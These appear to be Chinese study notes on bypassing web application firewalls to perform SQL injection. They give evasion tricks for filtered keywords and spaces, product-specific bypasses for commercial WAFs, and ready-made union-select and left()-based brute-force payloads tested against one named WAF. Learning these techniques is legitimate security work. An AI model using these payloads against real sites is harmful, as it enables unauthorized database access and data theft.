WAF绕过

1）WAF介绍

Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。

waf与防火墙的区别

​ 网络防火墙作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求,从80或443端口顺利通过防火墙检测。

分类

  • 硬件设备类(绿盟、启明、安恒、知道创宇、天融信等)
  • 软件产品类(安全狗、云锁、D盾等)
  • 基于云的WAF (阿里云、安恒、知道创宇)

探测

  • X-Powered-By:WAF 少部分waf会有这个标志，在响应头中

2）常用的绕过手段

1、使用特殊字符(Ascii码不在32- 127范围内)
2、使用特殊语法(非常规的SQL注入语句)
3、使用超长数据(超长的数据安全狗无法处理)
4、利用安全狗的白名单策略(借助安全狗的白名单逆袭)
5、利用操作系统特性(利用非安全狗防护策略的特性完成逆袭)
6、其它的一些手段或是以上方法的结合(一些其它的技巧)

1.and/or 被过滤/拦截

  • 双写anandd、oorr
  • 使用运算符代替&&、||
  • 直接拼接=号，如：?id=1=(condition)
  • 其他方法，如：?id=1^(condition)

2.空格被过滤/拦截

  • 多层括号嵌套
    • where(password=123/**/and(isDeleted=1))
  • 改用+号
    • get请求空格都可以修改
    • 其他请求只有部分空格可以，因为会带入数据库进行执行
  • 使用注释代替
    • /*!*/
    • /**/
  • and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)
    • and~~1
    • and~~1=1
    • and!!!1
    • and!!!!~~1
  • %09, %0a, %0b, %0c, %0d, %a0,%20等部分不可见字符可也代替空格
    • %09->tab键
    • %0a->换行
    • %0b,%0c,%0d,%a0->一些特殊字符
    • %20->空格

3.逗号被过滤/拦截

  • 改用盲注
  • 使用join语句代替
  • substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4

4.其他系统关键字被过滤/拦截

  • 双写绕过关键字过滤
  • 使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。

5.特殊方法

  • 在360主机卫士以及护卫神中，同时使用get以及post提交数据是可以直接绕过的
  • 在aspx中，可以使用%00截断，这样waf识别不到
  • 在WTS这款waf中，只需要将空格替换为+号即可绕过

内联注释解析

  • 语法：/*! ?? */，里面的??可以替换为任何内容
  • 当里面的内容为非版本号时，那么它将不会起到注释作用，会将里面的内容识别为语句的一部分
    • 版本号，必须在10000-99999之间的数值才是版本号
    • 格式：版本号...
      • 输入的版本号大于当前版本号，那么内容将会全部注释
      • 输入的版本号小于当前版本号，那么会将除了版本号以外的内容当做sql语句
  • 嵌套使用
    • /*! ?? /*! ?? */
    • 嵌套使用算多块，每一块被注释了并不会影响到其他的

3.使用联合查询

被拦截了。使用fuzz，获取到：

  • union不拦截
  • union select拦截
  • select xx不拦截

根据fuzz那么就可以获取到 只用在union 与 select之前加上过滤符即可

方式一：?id=-1' union /*//--/*/select 1,2,3 -- x

​ 或者使用布尔进行联合?id=1' and /*//--/*/1=2 union /*//--/*/select 1,2,3 -- x

方式二，使用换行进行绕过：?id=-1' union/*!-- x/*%0aselect/*!1,2,3*/ -- x。%0a就是换行符，所以在其之前的注释失效了。

5）云锁

1.FUZZ

注释符

使用%23以及--都可以。

order by

  • order不拦截
  • by不拦截
  • order by拦截
  • order by x拦截
  • /*!*/内联注释会被拦截

我们可以使用其他方式获取字段数：group by。

经过测试发现阈值为4，那么字段数为3。

union select

使用union select被拦截

使用select from同样被拦截。

因为内联注释被拦截，导致我们无法绕过，并且其他方法也无法奏效。

延时盲注

使用sleep()函数没有被拦截，但是无法使用查询会导致关键信息获取不到。

报错注入

使用updatexml()和extractValue均被拦截

尝试使用floor报错注入，发现没有被拦截，但是还是和之前原因一样，无法查询，那么就无法获取关键信息。

内置函数

database()、user()被拦截，@@basedir、version()、@@version_compile_os没有被拦截

2.使用其他方式注入

字符替换

and和or我们使用&&以及||进行代替。

因为&是参数的截断符，所以我们需要将其进行url编码：%26

使用left函数爆破获取列名

left(str,len)

  • 从左往右截取字符串的第len个字符
  • 参数
    • 第一个：需要截取的字符串
      • 如果不用引号那么就代表列名
    • 第二个：需要截取的长度
      • 小于等于0，结果为""
      • 大于等于1，结果为对应截取的字符串
      • 大于字符串长度，结果为整个字符串

我们利用left函数第一个参数的特性暴力获取参数名，并利用比较运算符构造出一个布尔。

payload：?id=1' && left('abc',1)>='a'--+

只要不报出这个错误，那么说明有这个字段，可以使用burp suite进行爆破

最终获取到字段：id、username、password

获取数据

同样使用left函数获取数据。首先让前面条件为假，然后我们控制后面的条件，使其显示我们需要的值。

因为拦截了内联注释，所以导致很多绕过方式无法使用，所以在有回显的情况下只能获取到当前表的数据。在无回显时可以使用布尔盲注获取数据，但也只能获取当前表的数据。
